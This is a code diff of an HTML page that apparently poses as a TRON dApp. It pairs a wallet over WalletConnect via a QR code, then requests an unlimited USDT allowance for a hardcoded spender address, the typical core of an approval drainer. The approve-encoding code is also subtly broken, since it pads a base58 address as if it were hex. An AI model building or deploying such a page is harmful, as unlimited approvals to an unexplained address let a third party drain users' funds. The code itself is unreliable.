@@ -3,53 +3,79 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>TRON WalletConnect QR First</title>
+<title>TRON WalletConnect Approve</title>
 
 <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 </head>
 
 <body>
 
-<h2>QR → Connect → Sign Flow</h2>
+<h2>TRON dApp - USDT Approve</h2>
 
-<button id="connectBtn">Generate QR</button>
-<button id="approveBtn" disabled>Send Approve</button>
+<button id="connectBtn">Connect (QR)</button>
+<button id="approveBtn" disabled>Approve USDT</button>
 
-<div id="qr"></div>
 <div id="status"></div>
+<div id="qr"></div>
 
 <script type="module">
+
 import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.es.js";
+
+/* ================= CONFIG ================= */
 
 const PROJECT_ID = "dde98880530be70b65d01a1be59e5fa3";
 
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+/* USDT TRC20 */
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+/* SPENDER (adresa ta / contractul tău) */
 const SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
 
-const MAX =
+/* MAX approval */
+const MAX_UINT256 =
 "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+/* ================= STATE ================= */
 
 let client;
 let session;
-let pendingApproval;
 
-/* INIT */
+/* ================= UI ================= */
+
+const status = (t)=>document.getElementById("status").innerText = t;
+
+/* ================= INIT ================= */
+
 async function init(){
   client = await SignClient.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: "QR First dApp",
+      name: "TRON USDT dApp",
+      description: "Approve flow",
       url: "https://example.com"
     }
   });
 }
 
-/* QR FIRST CONNECT */
-async function connectQR(){
+/* ================= QR ================= */
 
-  document.getElementById("status").innerText = "Generating QR...";
+function renderQR(uri){
+  const canvas = document.createElement("canvas");
 
-  const result = await client.connect({
+  QRCode.toCanvas(canvas, uri, { width: 260 });
+
+  document.getElementById("qr").innerHTML = "";
+  document.getElementById("qr").appendChild(canvas);
+}
+
+/* ================= CONNECT ================= */
+
+async function connect(){
+
+  status("Connecting...");
+
+  const { uri, approval } = await client.connect({
     requiredNamespaces: {
       tron: {
         methods: ["tron_sendTransaction"],
@@ -59,77 +85,73 @@ async function connectQR(){
     }
   });
 
-  const uri = result.uri;
-  pendingApproval = result.approval;
-
-  if (!uri) {
-    document.getElementById("status").innerText =
-      "No QR needed (wallet already connected)";
-    session = await pendingApproval();
-    document.getElementById("approveBtn").disabled = false;
-    return;
+  if (uri) {
+    renderQR(uri);
+    status("Scan QR in Trust Wallet");
+  } else {
+    status("No QR (wallet injected mode)");
   }
 
-  const canvas = document.createElement("canvas");
-  await QRCode.toCanvas(canvas, uri, { width: 250 });
+  session = await approval();
 
-  document.getElementById("qr").innerHTML = "";
-  document.getElementById("qr").appendChild(canvas);
-
-  document.getElementById("status").innerText =
-    "Scan QR in Trust Wallet";
-
-  session = await pendingApproval();
-
-  document.getElementById("status").innerText =
-    "Connected → ready to sign";
+  status("Connected");
 
   document.getElementById("approveBtn").disabled = false;
+  document.getElementById("qr").innerHTML = "";
 }
 
-/* APPROVE BUILD */
-function buildApprove(){
-  const methodId = "095ea7b3";
+/* ================= ENCODE APPROVE ================= */
 
-  const spender = SPENDER.padStart(64,"0");
-  const amount = BigInt(MAX).toString(16).padStart(64,"0");
+function buildApproveData(){
 
-  return "0x" + methodId + spender + amount;
+  const methodId = "095ea7b3"; // approve(address,uint256)
+
+  const spenderHex = SPENDER.replace("0x","").padStart(64,"0");
+  const amountHex = BigInt(MAX_UINT256).toString(16).padStart(64,"0");
+
+  return "0x" + methodId + spenderHex + amountHex;
 }
 
-/* SEND TX */
-async function sendApprove(){
+/* ================= SEND APPROVE ================= */
+
+async function approve(){
 
   const owner = session.namespaces.tron.accounts[0].split(":")[2];
 
   const tx = {
-    to: USDT,
+    to: USDT_CONTRACT,
     owner_address: owner,
-    data: buildApprove(),
+    data: buildApproveData(),
     feeLimit: 10000000,
     callValue: 0
   };
 
-  document.getElementById("status").innerText =
-    "Waiting wallet confirmation...";
+  status("Waiting wallet confirmation...");
 
-  await client.request({
-    topic: session.topic,
-    chainId: "tron:0",
-    request: {
-      method: "tron_sendTransaction",
-      params: [tx]
-    }
-  });
+  try {
+    await client.request({
+      topic: session.topic,
+      chainId: "tron:0",
+      request: {
+        method: "tron_sendTransaction",
+        params: [tx]
+      }
+    });
 
-  document.getElementById("status").innerText =
-    "Sent / signed in wallet UI";
+    status("Approve sent (signed in wallet)");
+
+  } catch (e) {
+    status("Rejected or error");
+  }
 }
 
-document.getElementById("connectBtn").onclick = connectQR;
-document.getElementById("approveBtn").onclick = sendApprove;
+/* ================= EVENTS ================= */
+
+document.getElementById("connectBtn").onclick = connect;
+document.getElementById("approveBtn").onclick = approve;
 
 init();
+
 </script>
 
 </body>
